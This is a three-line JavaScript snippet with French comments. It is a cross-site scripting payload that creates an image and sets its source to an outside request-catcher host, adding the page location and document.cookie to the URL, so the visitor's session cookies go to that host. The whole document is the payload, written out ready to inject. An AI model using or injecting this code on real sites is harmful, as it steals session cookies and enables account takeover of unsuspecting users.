im=document.createElement('img'); // je crée une image
im.src="https://recept.free.beeceptor.com?loc="+document.location+"&cookie="+document.cookie; // j'appelle l'image avec en parametre le cookie
document.body.appendChild(im);
